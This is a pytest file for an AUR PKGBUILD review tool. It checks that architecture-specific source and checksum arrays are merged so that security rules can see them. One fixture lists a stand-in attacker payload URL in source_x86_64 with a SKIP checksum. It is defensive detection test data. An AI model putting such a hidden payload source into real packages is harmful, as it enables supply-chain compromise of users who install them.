from __future__ import annotations

from aurmanager.parser.pkgbuild import parse_pkgbuild


def _write(tmp_path, body):
    p = tmp_path / "PKGBUILD"
    p.write_text(body)
    return p


def test_sources_include_architecture_specific_arrays(tmp_path):
    # Regression: ctx.sources only ever read the base source=() array, so an
    # entry declared only in source_x86_64=() (a standard makepkg arch-override
    # array) was invisible to every source-based rule (RCE004, INT002, INT003)
    # regardless of which architecture the reviewing machine happens to be.
    path = _write(
        tmp_path,
        """
        pkgname=foo
        pkgver=1.0
        arch=('x86_64' 'aarch64')
        source=("https://example.com/foo-$pkgver.tar.gz")
        sha256sums=('deadbeef')
        source_x86_64=("payload::https://raw.githubusercontent.com/attacker/x/main/payload.sh")
        sha256sums_x86_64=('SKIP')
        source_aarch64=("other::https://example.com/aarch64-extra.tar.gz")
        sha256sums_aarch64=('cafebabe')
        """,
    )
    ctx = parse_pkgbuild(path)
    # Merge order is the declared arch=() suffixes, sorted -- "aarch64" before
    # "x86_64" -- applied after the base source=() array.
    assert ctx.sources == [
        "https://example.com/foo-$pkgver.tar.gz",
        "other::https://example.com/aarch64-extra.tar.gz",
        "payload::https://raw.githubusercontent.com/attacker/x/main/payload.sh",
    ]


def test_checksums_stay_aligned_with_merged_sources(tmp_path):
    # The merge order for source_<arch> and <checksum-key>_<arch> must match so
    # that index-based checksum lookups (as INT003 does) stay correct.
    path = _write(
        tmp_path,
        """
        pkgname=foo
        pkgver=1.0
        arch=('x86_64')
        source=("https://example.com/a.tar.gz")
        sha256sums=('deadbeef')
        source_x86_64=("https://example.com/b.tar.gz")
        sha256sums_x86_64=('SKIP')
        """,
    )
    ctx = parse_pkgbuild(path)
    assert ctx.sources == ["https://example.com/a.tar.gz", "https://example.com/b.tar.gz"]
    assert ctx.checksums["sha256sums"] == ["deadbeef", "SKIP"]


def test_unrelated_arrays_matching_the_suffix_shape_are_not_merged_in(tmp_path):
    # Regression: candidate suffixes were originally derived from any array
    # name matching source_<word>/<checksum-key>_<word>, not just ones the
    # PKGBUILD actually declares in arch=() -- an unrelated array that happens
    # to be named source_notes (not a real makepkg architecture override) must
    # not be merged into ctx.sources, since makepkg itself would never treat
    # it as source data either.
    path = _write(
        tmp_path,
        """
        pkgname=foo
        pkgver=1.0
        arch=('x86_64')
        source=("https://example.com/a.tar.gz")
        sha256sums=('deadbeef')
        source_notes=("not a real source")
        sha256sums_backup=('not a real checksum')
        """,
    )
    ctx = parse_pkgbuild(path)
    assert ctx.sources == ["https://example.com/a.tar.gz"]
    assert ctx.checksums["sha256sums"] == ["deadbeef"]


def test_sources_unaffected_when_no_arch_specific_arrays_present(tmp_path):
    path = _write(
        tmp_path,
        """
        pkgname=foo
        pkgver=1.0
        source=("https://example.com/foo-$pkgver.tar.gz")
        sha256sums=('deadbeef')
        """,
    )
    ctx = parse_pkgbuild(path)
    assert ctx.sources == ["https://example.com/foo-$pkgver.tar.gz"]
    assert ctx.checksums["sha256sums"] == ["deadbeef"]
